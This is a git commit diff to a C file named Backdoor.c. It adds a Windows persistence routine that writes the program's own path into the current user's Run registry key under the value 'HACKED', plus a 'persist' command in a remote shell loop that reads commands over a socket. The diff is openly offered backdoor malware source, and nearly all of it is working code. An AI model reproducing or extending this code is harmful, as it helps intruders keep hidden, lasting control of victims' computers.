0235669ec81bb93ac2e906fa8455c0366574b641
devcass <thiefcass@gmail.com>
2020-10-08 14:18:17 -0300

    feat: creating persistence

--- Backdoor.c
+++ Backdoor.c
@@ -14,6 +14,38 @@
 
 int sock;
 
+int bootRun() {
+	char err[128] = "Failed\n";
+	char suc[128] = "Create Persistence At: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
+	TCHAR szPath[MAX_PATH];
+	DWORD pathLen = 0;
+
+	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
+
+	if(pathLen == '0') {
+		send(sock, err, sizeof(err), 0);
+		return -1;
+	}
+
+	HKEY NewVal;
+
+	if(RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
+		send(sock, err, sizeof(err), 0);
+		return -1;
+	}
+
+	DWORD pathLenInBytes = pathLen * sizeof(*szPath);
+
+	if(RegSetValueEx(NewVal, TEXT("HACKED"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
+		RegCloseKey(NewVal);
+		send(sock, err, sizeof(err), 0);
+		return -1;
+	}
+	RegCloseKey(NewVal);
+	send(sock, suc, sizeof(suc), 0);
+	return 0;
+}
+
 char * 
 str_cut(char str[], int slice_from, int slice_to) {
 	if(str[0] == '\0') 
@@ -66,6 +98,9 @@ void Shell() {
 			} 
 			else if (strncmp("cd ", buffer, 3) == 0) {
 				chdir(str_cut(buffer, 3, 100));
+			}
+			else if(strncmp("persist", buffer, 7) == 0) {
+				bootRun();
 			}
 			else {
 				FILE *fp;
